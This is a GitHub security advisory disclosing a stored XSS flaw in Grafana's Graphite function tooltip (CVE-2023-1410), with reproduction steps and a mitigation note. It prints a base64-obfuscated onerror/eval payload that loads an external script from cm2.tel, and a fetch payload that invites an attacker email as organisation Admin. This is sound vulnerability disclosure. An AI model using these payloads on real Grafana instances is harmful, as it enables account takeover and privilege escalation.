# [M] Grafana Stored Cross-site Scripting in Graphite FunctionDescription tooltip

## Summary
Severity: Medium
Advisory: GHSA-qrrg-gw7w-vp76
CVE: CVE-2023-1410
CWE: CWE-79
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:H/UI:R/S:C/C:H/I:L/A:N (CVSS_V3)
Published: 2023-03-23
Source: https://github.com/advisories/GHSA-qrrg-gw7w-vp76
Type: github-advisory

## Affected
- Go: `github.com/grafana/grafana` — affected >=8.0.0 <8.5.22
- Go: `github.com/grafana/grafana` — affected >=9.3.0 <9.3.11
- Go: `github.com/grafana/grafana` — affected >=9.4.0 <9.4.7
- Go: `github.com/grafana/grafana` — affected >=9.0.0 <9.2.15

## Details
### Summary
When a Graphite data source is added, one can use this data source in a dashboard. This contains a feature to use `Functions`. Once a function is selected, a small tooltip will be shown when hovering over the name of the function. This tooltip will allow you to delete the selected Function from your query or show the Function Description. However, no sanitization is done when adding this description to the DOM. Since it is not uncommon to connect to public data sources, and attacker could host a Graphite instance with modified Function Descriptions containing XSS payloads. When the victim uses it in a query and accidentally hovers over the Function Description, an attacker controlled XSS payload will be executed. This can be used to add the attacker as an Admin for example. 

### Details

1. Spin up your own Graphite instance. I've done this using the `make devenv sources=graphite`.
2. Now start a terminal for your Graphite container and modify the following file `/opt/graphite/webapp/graphite/render/functions.py` 
3. Basically you can pick any function but I picked the `aggregateSeriesLists` function. Modify its description to be `"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vY20yLnRlbCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))>`

The result would look like this:

```python
def aggregateSeriesLists(requestContext, seriesListFirstPos, seriesListSecondPos, func, xFilesFactor=None):
  """                                                                              
                                                                                              
  "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vY20yLnRlbCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))>
                                                                           
  """                  
  if len(seriesListFirstPos) != len(seriesListSecondPos):   
    raise InputParameterError(             
      "seriesListFirstPos and seriesListSecondPos argument must have equal length")
  results = []                                          
                                    
  for i in range(0, len(seriesListFirstPos)):        
    firstSeries = seriesListFirstPos[i]                                           
    secondSeries = seriesListSecondPos[i]         
    aggregated = aggregate(requestContext, (firstSeries, secondSeries), func, xFilesFactor=xFilesFactor) 
    if not aggregated: # empty list, no data found                          
      continue                   
    result = aggregated[0]  # aggregate() can only return len 1 list           
    result.name = result.name[:result.name.find('Series(')] + 'Series(%s,%s)' % (firstSeries.name, secondSeries.name)
    results.append(result)                                                                           
  return results                                                         
                                                                                                                   
                                                                                                       
aggregateSeriesLists.group = 'Combine'                                                             
aggregateSeriesLists.params = [
  Param('seriesListFirstPos', ParamTypes.seriesList, required=True),
  Param('seriesListSecondPos', ParamTypes.seriesList, required=True),
  Param('func', ParamTypes.aggFunc, required=True),                                                       
  Param('xFilesFactor', ParamTypes.float),                                
]                                                                                                
```

4. Save and quit the file. Restart your Graphite Container (I did this using the Restart Icon in Docker Desktop)
5. Now login to your Grafana instance as an Organisation Admin.
6. Navigate to http://[grafana]/plugins/graphite and click `Create a Graphite data source`
7. Add the url to the attackers Graphite instance (maybe enable `Skip TLS Verify`) and click `Save & test` and `Explore`
8. In the newly opened page click the + icon next to `Functions` and search for `aggregateSeriesLists` and click it to add it.
9. Now hover over `aggregateSeriesLists` with your mouse and move your mouse to the `?` icon.

### Result

Our payload will trigger and in this case it will include an external script to trigger the alerts.

#### Decoded payload

```javascript
var a=document.createElement("script");a.src="https://cm2.tel";document.body.appendChild(a);
```

![image](https://user-images.githubusercontent.com/26874824/225035735-5d00e5d9-3302-4257-8f95-dd562e752893.png)


### Impact

In the POC we've picked 1 function to have a XSS payload, but a real attacker would of course maximize the likelihood by replacing all of it's descriptions with XSS payloads. As shown above the attacker can now run arbitrary javascript in the browser of the victim. The victim can be any user using the malicious Graphite instance in a query (or while Exploring), including the Organisation Admin. If so, an attacker could include a payload to add them as an admin themselves.

An example would be something like this:

```javascript
fetch("/api/org/invites", {
  "headers": {
    "content-type": "application/json"
  },
  "body": "{\"name\":\"\",\"email\":\"\",\"role\":\"Admin\",\"sendEmail\":true,\"loginOrEmail\":\"hacker@hacker.com\"}",
  "method": "POST",
  "credentials": "include"
});
```

### Mitigation

The vulnerability seems to occur in the following file: public\app\plugins\datasource\graphite\components\FunctionEditorControls.tsx

```typescript
const FunctionDescription = React.lazy(async () => {
  // @ts-ignore
  const { default: rst2html } = await import(/* webpackChunkName: "rst2html" */ 'rst2html');
  return {
    default(props: { description?: string }) {
      return <div dangerouslySetInnerHTML={{ __html: rst2html(props.description ?? '') }} />;
    },
  };
});
```

In many other similar cases, some form of sanitization is used. I would advise to use the same here as rst2html itself will just leave HTML untouched when parsing the expected reStructuredText from Graphite. So now when it is applied using dangerouslySetInnerHTML our XSS payload will survive.

## References
- https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76
- https://nvd.nist.gov/vuln/detail/CVE-2023-1410
- https://github.com/grafana/grafana/commit/42911348a76e8484396b951bef8b7bff97a84cbc
- https://github.com/grafana/grafana/commit/e59427c0747ae2f3feb1bfc3a4b87f0886208cc6
- https://github.com/grafana/grafana/commit/ef2eb2b6bf1d7c0fb781e3e05d0d1aecd6dd438a
- https://github.com/grafana/grafana/commit/f9548d33f8624d6694983fe5aad181007405be8a
- https://github.com/grafana/grafana
- https://grafana.com/security/security-advisories/cve-2023-1410
